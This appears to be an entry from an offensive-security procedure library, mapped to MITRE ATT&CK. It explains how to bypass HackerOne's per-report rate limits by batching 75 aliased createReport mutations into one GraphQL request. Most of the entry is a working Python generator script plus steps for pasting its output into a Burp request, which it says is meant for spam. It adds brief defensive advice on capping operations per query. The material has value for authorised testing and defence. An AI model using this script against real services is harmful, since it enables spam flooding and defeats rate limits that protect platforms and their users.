---
id: proc-python-batch-001
tags:
  - graphql
  - batching
  - python
type: procedure
tools:
  - '[[tools/Python]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/generate-batched-graphql-query]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:57.226Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Generate Batched GraphQL Mutation

## Summary

This procedure uses a Python script to generate a GraphQL mutation query batching 75 named createReport operations, enabling bulk report submission in a single request to bypass per-report rate limits.

## Description

HackerOne's GraphQL API lacks limits on named-based batching, allowing multiple mutations in one query. This script creates unique aliases (e.g., example0: createReport) for 75 reports, each with static placeholders for title, vulnerability_information, impact, and source. The output is an escaped string inserted into the HTTP request's query field, exploiting the vulnerability for spam.

## Requirements

1. Python 3.x installed
2. No external libraries needed (uses built-in string operations)
3. Target team_handle variable defined in the mutation
4. Basic understanding of GraphQL syntax

## Defense

Defensive measures and detection strategies:

- Limit the number of operations per GraphQL query (e.g., max 10 mutations)
- Implement payload size checks and anomaly detection on query complexity

## Objectives

1. Create a single mutation handling 75 reports
2. Ensure unique naming to avoid GraphQL parsing errors
3. Produce JSON-escaped output for HTTP payload

## Instructions

### Step 1: Define and Run Generation Function

**Context**: Execute the Python function to build the batched mutation.

**Command** ([[commands/generate-batched-graphql-query]]):

```python
def generate_query(index):
    return('example'+str(index)+': createReport(input: {team_handle: $team_handle, ' +
           'title: "Your Report Title", vulnerability_information: "Vulnerability Information", ' +
           'impact: "Impact Description", source: "Report Source"}) { ' +
           'was_successful errors { edges { node { id error_code field message __typename } __typename } ' +
           '__typename } }')
queries = []
for i in range(75):
    queries.append(generate_query(i))
main_mutation = ('mutation BulkReports($team_handle: String!) {\n ' + '\n '.join(queries) + '\n}')
print(repr(main_mutation).replace('"','\\"').replace("'",""))
```

> This generates and prints the full mutation string with 75 operations. Expected output: A long escaped string starting with 'mutation BulkReports...' containing all exampleN queries.

### Step 2: Insert into Request

**Context**: Copy the output and replace {your-generated-query} in the Burp request.

Paste the printed string into the JSON query field.

> Validates the batch for submission. Expected output: JSON payload with complete query, ready for sending.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/generate-batched-graphql-query]]

## Tools Used

- [[tools/Python]]

## Tags

- graphql
- batching
- python
